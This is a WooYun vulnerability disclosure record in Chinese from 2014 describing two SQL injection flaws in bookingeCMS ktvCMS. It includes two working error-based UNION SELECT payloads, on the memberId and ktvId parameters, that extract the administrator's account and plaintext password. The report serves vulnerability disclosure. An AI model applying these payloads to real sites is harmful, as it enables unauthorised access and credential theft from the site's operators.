{"id": 51672, "wybug_id": "wooyun-2014-073740", "wybug_title": "bookingeCMS ktvCMS SQL注入两枚", "wybug_corp": "bookingeCMS", "wybug_author": "PythonPig", "wybug_date": "2014-08-27 17:45", "wybug_open_date": "2014-11-25 17:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-27：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-11-25：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： bookingeCMS ktvCMS SQL注入11 详细说明：  注入第一枚：看到bookingeCMS的ktvCMS漏洞前面已经被连载到10了，这里就是11了，看过前面提过的漏洞，没有重复~0x00:bookingeCMS的ktvCMS在查看自己账号的更多点评时存在注入。\n\n0x01:参数memberId和size存在注入\n\n0x02:输入以下exp:\nmemberId=1712'UNION SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT concat(name,0x23,account,0x23,password)FROM my_admin LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a#&page=3&size=5\n爆出系统管理员及其密码，密码是明文！！！\n\n注入第二枚：看到bookingeCMS的ktvCMS漏洞前面已经被连载到11了，这里就是12了，看过前面提过的漏洞，没有重复~ 0x00:bookingeCMS的ktvCMS在查看任意一家ktv的相关评论，“加载更多”处存在注入。\n\n 0x01:参数ktvId和size存在注入\n\n0x02:以ktvId为例，输入以下exp:\nktvId=36'UNION SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x23,(SELECT concat(name,0x23,account,0x23,password)FROM my_admin LIMIT 0,1),0x23,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.tables GROUP BY x)a#&index=4&size=5\n爆出系统管理员及其密码，密码是明文！！！\n\n   漏洞证明：  \n\n\n\n   修复方案：  过滤、加密   版权声明：转载请注明来源 PythonPig@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}